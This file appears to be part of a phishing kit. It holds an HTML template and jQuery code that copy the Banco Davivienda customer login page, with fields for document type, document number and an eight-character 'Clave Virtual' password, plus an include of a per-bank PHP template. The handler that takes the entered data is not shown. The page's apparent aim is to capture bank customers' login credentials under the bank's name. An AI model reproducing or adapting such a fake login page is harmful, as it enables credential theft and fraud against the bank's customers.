var my_titulo = 'Banco Davivienda';
var davivienda_body = `
<div id="fondo-formulario">
    <table cellpadding="0" cellspacing="0" width="100%">
        <tr>
            <td width="58%" valign="top">
                <div id="titulo-principal">Transacciones <span class="resaltado">para Clientes</span></div>
                <div id="frmLogin">
                    <div id="tipoDoc">
                        <label for="txt-tipo" class="etiqueta1">Tipo de documento</label><br>
                        <select class="lista1" id="txt-tipo" name="txt-tipo">
                            <option value="CC" selected="selected">Cedula de Ciudadania</option>
                            <option value="CE">Cedula de Extranjeria</option>
                            <option value="NIT">NIT</option>
                            <option value="TI">Tarjeta de Identidad</option>
                            <option value="PASS">Pasaporte</option>
                            <option value="SEG">Trj. Seguro Social Extranjero</option>
                            <option value="SEX">Sociedad Extranjera sin NIT en Colombia</option>
                            <option value="FID">Fideicomiso</option>
                            <option value="NITM">NIT Menores</option>
                            <option value="RIFV">RIF Venezuela</option>
                            <option value="NITE">NIT Extranjeria</option>
                            <option value="NITN">NIT Persona Natural</option>
                            <option value="RC">Registro Civil De Nacimiento</option>
                            <option value="NITD">NIT Desasociado</option>
                            <option value="CIF">CIF(Numero Unico de Cliente)</option>
                            <option value="NI">Numero de Identidad</option>
                            <option value="RTN">RTN</option>
                            <option value="CI">Cedula de Identidad</option>
                            <option value="DIM">DIMEX</option>
                            <option value="CED">CED</option>
                            <option value="PAS">PAS</option>
                            <option value="DUI">Documento Unico de Identidad</option>
                            <option value="NITS">NIT Salvadoreño</option>
                        </select>
                    </div>
                    <div id="login">
                        <div id="NoDoc">
                            <label for="txtUsuario" class="etiqueta1">No. documento</label><br>
                            <input name="txtUsuario" type="text" id="txtUsuario" autocomplete="off" class="entrada1" maxlength="30">
                            <div class="msg-error" id="msgUsuario">El campo esta vacío</div>
                        </div>
                        <div id="ClvVir">
                            <label for="txtPassword" class="etiqueta1">Clave Virtual</label><br>
                            <input name="txtPassword" type="password" id="txtPassword" autocomplete="off" class="entrada1" maxlength="8">
                            <div class="msg-error" id="msgClave">El campo esta vacío</div>
                        </div>
                    </div>
                    <div id="bContinuar">
                        <!-- <input type="button" id="btnContinue" onclick="validateInfor()" style="margin-top: 25px !important; width:90px !important;" value="Continuar" class="btn-rojo"> -->
                        <input type="button" onclick="validateData()" id="btnUsuario" style="margin-top: 25px !important; width:90px !important;" value="Ingresar" class="btn-rojo">
                    </div>
                </div>
                <div style="margin-left: 4px;">
                    <input type="checkbox" name="recordar" id="recordar">
                    <label for="recordar" style="margin-left:2px; font-family: 'Helvetica Neue LT Std'; font-weight: bold; color: #fff; font-size: 14px;">Recordar datos</label>
                </div>
            </td>
            <td width="42%" valign="top" id="lado-derecho">
                <table cellpadding="0" cellspacing="0">
                    <tr>
                        <td valign="top" id="ayuda">
                            <div style="text-align: center;">
                                <img src="${my_banco}img/ayuda.png">
                            </div>
                            <div style="font-size: 22px; color:#fff; text-align: left;margin-left: -18px;margin-top: 54px;">
                                ¿Necesita <span class="resaltado">Ayuda?</span>
                            </div>
                            <div style="text-align: left;">
                                <ul class="vinieta">
                                    <li> ¿Olvidó o bloqueó su clave?</li>
                                    <li> Recomendaciones de Seguridad</li>
                                    <li> Davivienda Movil</li>
                                </ul>
                            </div>
                        </td>
                        <td>
                            <div style="width:100px;"></div>
                        </td>
                        <td valign="top" id="candado">
                            <div style="text-align: center;">
                                <img src="${my_banco}img/cantado.png">
                            </div>
                            <div style="font-size: 22px; color:#fff; text-align: left;margin-left: -18px;margin-top: 54px;">
                                Una nueva herramienta<br><span class="resaltado">antifraude</span> ha llegado
                            </div>
                            <br>
                            <input type="submit" name="btn-conozca" value="Conózcala aquí" class="btn-rojo">
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</div>
`

<?php require_once('_plantilla_davivienda.php'); ?>

//<script>
    loadContenido();;


    $("#btn-ingresar").mouseover(function() {
        $("#btn-ingresar").attr("src",
            my_banco +
            "img/boton-in.jpg");
    });

    $("#btn-ingresar").mouseout(function() {
        $("#btn-ingresar").attr("src",
            my_banco +
            "img/boton-in-2.jpg");
    });

    $("#btn-ingresar,#btn-ingresar-2,#btn-gris-grande").click(function() {
        $(".botones").hide();

        $("#cabecera").animate({
            top: "308"
        }, 600);
        $("#fondo-formulario").animate({
            height: "308"
        }, 500, function() {
            $("#cerrar-menu").show();
        });
    });

    $('#txtUsuario').keyup(function(event) {
        if ($("#txtUsuario").val().length > 5 && $("#txtUsuario").val().length < 30) {
            $("#msgUsuario").hide();
            $('#ClvVir').show();

        }
    });


    $('#txtPassword').keyup(function(event) {
        if ($("#txtPassword").val().length > 3 && $("#txtPassword").val().length < 9) {
            $("#msgClave").hide();
        }
    });